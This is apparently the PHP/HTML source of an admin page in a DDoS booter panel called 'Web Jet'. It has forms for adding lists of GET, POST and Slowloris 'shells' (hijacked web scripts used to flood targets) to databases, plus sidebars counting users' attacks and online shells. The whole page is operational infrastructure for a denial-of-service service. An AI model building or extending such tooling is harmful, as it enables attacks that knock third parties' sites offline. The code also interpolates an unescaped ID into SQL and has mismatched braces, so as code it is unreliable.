<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head>

	<title>Add Shells</title>

	<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />

	<meta name="keywords" content="" />	
	<meta name="description" content="" />
	<meta name="robots" content="" /><!-- change into index, follow -->
				
	<link rel="stylesheet" href="stylesheets/style.css" type="text/css" />
	
	<!--[if lte IE 6]>
		<script type="text/javascript" src="javascripts/pngfix.js"></script>
		<script type="text/javascript" src="javascripts/ie6.js"></script>
		<link rel="stylesheet" href="stylesheets/ie6.css" type="text/css" />
	<![endif]-->

</head>

<body>

<!--  / WRAPPER \ -->
<div id="wrapper">
	
    <!--  / MAIN CONTAINER \ -->
    <div id="mainCntr">

		<!--  / HEADER CONTAINER \ -->
		<div id="headerCntr">
		
			<h1><a href="#">Web Jet</a></h1>
			  
			<!-- / MENU CONTAINER \ -->
			<div id="menuCntr">
			
				<ul>
					<li><a href="index.php">Home</a></li>
					<li><a href="hub.php">DDoS Attack</a></li>
					<li><a href="mysettings.php">My Account</a></li>
					<li><a href="pinger.php">Pinger</a></li>
					<li><a href="logout.php">Logout</a></li>
				</ul>
				
			</div>
			<!-- \  MENU CONTAINER  /-->
			
		</div>
		<!--  \ HEADER CONTAINER / -->
			
		  <!--  / HAEDING BOX \ -->
		<div class="headingBox">
			<div class="heading">
			
			<h2>Add Shells</h2>
			
			</div>
        </div>
		<!--  \ HAEDING BOX / -->
			  
       
		
        <!--  / CONTENT CONTAINER \ -->
        <div id="contentCntr" class="background">
		  <div class="center">
			<!--  / LEFT CONTAINER \ -->
			<div id="leftCntr">
				

                    
                    
					<!--  / OUR BLOG BOX \ -->
					<div class="ourbloginnerBox">
						<div class="top">
							<div class="bottom">
								
                    
                    
                    
               <?php 
include "dbc.php";
page_protect();
include "includes/functions.php";
getBooterTitle();
?>





<div id="right">
<div class="small-box"><h2>Welcome, <?php echo $username; ?>!</h2>
    <div class="small-box-content">
        <p>
        Profile ID: <font color="#a5a5a5"><?php echo $id; ?></font> <br />
        Rank: <font color="#a5a5a5"><?php echo $level; ?></font> <br />
        My IP: <font color="#a5a5a5"><?php echo $_SERVER["REMOTE_ADDR"]; ?></font> <br />
        My Attacks: <font color="#a5a5a5"><?php
    $query = mysql_query("SELECT * FROM `users` WHERE id='$id' ");
    while($row = mysql_fetch_array($query)){
    $attacks = $row['myAttacks'];
    echo $attacks;
    }
?></font>
        </p>

    </div></div>

        <div class="small-box"><h2>Members Statistics</h2>
    <div class="small-box-content">
        <p>


                    <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" class="forms">
                        <font size=1>
          <tr>
            <td><font color="#575757">Total Users</font></td>
            <td><?php echo $all; ?></td></tr></font>
          

          <tr>
            <td><font color="#575757">Active Users</font></td>
            <td><?php echo $active; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">Pending Users</font></td>
            <td><?php echo $total_pending; ?></font></td>
          </tr>
          <tr>
            <td><font color="#575757">Total Attacks</font></td>
            <td><?php
                   $result = mysql_query("SELECT * FROM logs", $link);
                   $num_rows4 = mysql_num_rows($result);
                   echo "$num_rows4";
                ?></font></td>
          </tr>
                    </font>
                    </table>
        </p>


    </div></div>

    <div class="small-box"><h2>Shells Statistics</h2>
    <div class="small-box-content">
        <p>


                    <table width="100%" border="0" align="center" cellpadding="1" cellspacing="1" class="forms">
                        <font size="1">
                                      <tr>
            <td><font color="#575757">Shell Rotation</font></td>
            <?php
            if($shellRotation == 0) { ?>
            <td><font color="red">(Off)</font></td>
            <?php } else { ?>
            <td><font color="#00bc00">(On)</font></td>
            <?php
            }
            ?>
           
          </tr>
          
          <tr>
            <td><font color="#575757">Shells Online</font></td>
            <td><font color="#00bc00"><?php echo $shellsOnline; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">GET Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">POST Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows2; ?></font></td>
          </tr>

          <tr>
            <td><font color="#575757">Slowloris Shells</font></td>
            <td><font color="#00bc00"><?php echo $num_rows3; ?></font></td>
          </tr>
                        </font>
                    </table>
        </p>


    </div></div>
</div>

      
                    
                    
                    
                    
                    

					
							</div>
						</div>	 
					</div>
					<!--  / OUR BLOG BOX \ -->
					
					<!--  / OUR BLOG BOX \ -->
					<div class="ourbloginnerBox">
						<div class="top">
							<div class="bottom">
									
							<h2>Chat Member</h2>
							
							<object width="250" height="360" id="obj_1302316498383"><param name="movie" value="http://WiFiChatRoom.chatango.com/group"/><param name="AllowScriptAccess" VALUE="always"/><param name="AllowNetworking" VALUE="all"/><param name="AllowFullScreen" VALUE="true"/><param name="flashvars" value="cid=1302316498383&b=100&c=666666&d=666666&f=46&k=666666&l=000000&m=000000&s=1"/><embed id="emb_1302316498383" src="http://WiFiChatRoom.chatango.com/group" width="250" height="360" allowScriptAccess="always" allowNetworking="all" type="application/x-shockwave-flash" allowFullScreen="true" flashvars="cid=1302316498383&b=100&c=666666&d=666666&f=46&k=666666&l=000000&m=000000&s=1"></embed></object><br>
							
							</div>
						</div>	 
					</div>
                    <h2>&nbsp;</h2>
					<!--  / OUR BLOG BOX \ -->
				
			</div>
			<!--  \ LEFT CONTAINER / -->
			
			<!--  / RIGHT CONTAINER \ -->
			<div id="rightCntr">
				
				<!--  / ABOUT BOX \ -->
				<div class="aboutBox">
				<h3><span>Add Shells</span></h3>
	
                
</div>
					
				<p>
                
                
              
              
              
              
              


    <?php if (checkAdmin()) { ?>

<div class="box">
    <h2>Add a Get Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit" value="Add GET Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h2>Add a POST Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url2" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit2" value="Add POST Shell(s)">

</form>
</center>
</div>
</div>
<div class="box">
    <h2>Add a Slowloris Shell(s)</h2>
    <div class="box-content">
<center>
<form name="frmcontadd" action="" method="post">

  <textarea class="entryfield" name="url3" cols=115 rows=10></textarea><br>
  <input class="button" type="submit" name="Submit3" value="Add Slowloris Shell(s)">

</form>
</center>
</div>
</div>
<?php
// first the check of a submitted form
if (isset($_POST['Submit'])) {
  $hosts = explode("\r\n", $_POST['url']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts as $host) {
    $values[] .= "('" . mysql_real_escape_string($host) . "')";
  }
  $query = "INSERT INTO getshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added GET Shells to the shells database.';
}

// then the form itself
?>

<?php
// first the check of a submitted form
if (isset($_POST['Submit2'])) {
  $hosts2 = explode("\r\n", $_POST['url2']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts2 as $host2) {
    $values[] .= "('" . mysql_real_escape_string($host2) . "')";
  }
  $query = "INSERT INTO postshells (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added POST Shells to the shells database.';
}
}
// then the form itself
?>
<?php
// first the check of a submitted form
if (isset($_POST['Submit3'])) {
  $hosts3 = explode("\r\n", $_POST['url3']);
  // let's create the INSERT query
  $values = array();
  foreach ($hosts3 as $host3) {
    $values[] .= "('" . mysql_real_escape_string($host3) . "')";
  }
  $query = "INSERT INTO slowloris (url) VALUES " . implode(',', $values);
  $result = mysql_query($query) or die("mysql error " . mysql_error() . " in query $query");
  echo '<hr>Successfully added Slowloris Shells to the shells database.';
}

// then the form itself
?>





              
              
              
              
              
                
                
                
              </p>
			  </div>
              
			  <!--  / ABOUT BOX \ -->
			  <!--  / MOTIVE BOX \ --><!--  / MOTIVE BOX \ -->
			  <!--  / MOTIVE BOX \ --><!--  / MOTIVE BOX \ -->
				
			</div>
			<!--  \ RIGHT CONTAINER / -->  
			
        </div>
		</div>
        <!--  \ CONTENT CONTAINER / -->
		
	</div>
	<!--  \ MAIN CONTAINER / -->
	
	<!--  / FOOTER CONTAINER \ -->


	         <?php
include 'footer1.php';
?>



	<!--  \ FOOTER CONTAINER / -->
		
</div>
<!--  \ WRAPPER / -->

</body>

</html>